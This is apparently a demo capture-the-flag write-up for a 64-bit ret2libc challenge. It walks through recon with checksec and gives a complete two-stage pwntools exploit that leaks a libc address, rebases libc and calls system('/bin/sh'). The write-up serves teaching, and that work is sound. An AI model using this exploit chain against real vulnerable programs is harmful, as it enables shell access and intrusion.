ret2libc warmup

Example CTF 2026  ·  category: pwn  ·  300 pts  ·  solved 2026-02-15

Challenge description

"No shellcode allowed. Good luck." — a 64-bit ELF and its libc.

Note: this is a demo writeup so you can see the format. Replace it with a real one.

Recon

$ checksec ./warmup
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE

No canary and no PIE means a straightforward stack overflow with fixed addresses. NX rules out shellcode, so this is a ret2libc. The vulnerable read is a gets() into a 64-byte buffer.

Exploitation

Step one: leak a libc address by calling puts() on puts@GOT, then return to main to go around again. 

from pwn import *

elf  = context.binary = ELF('./warmup')
libc = ELF('./libc.so.6')
io   = process('./warmup')

pop_rdi = 0x401263          # from ROPgadget
offset  = 72

payload  = b'A' * offset
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])
io.sendlineafter(b'> ', payload)

leak = u64(io.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']
log.success(f'libc base: {hex(libc.address)}')

Step two: with libc rebased, return to system("/bin/sh").

ret = 0x40101a              # stack alignment for movaps
payload  = b'A' * offset
payload += p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
io.sendlineafter(b'> ', payload)
io.interactive()

Flag

flag{r0p_y0ur_way_t0_a_sh3ll}

Takeaways

  • Don't forget the ret gadget for movaps alignment on modern libc.
  • Leak, recompute base, re-trigger — the canonical two-stage ret2libc.
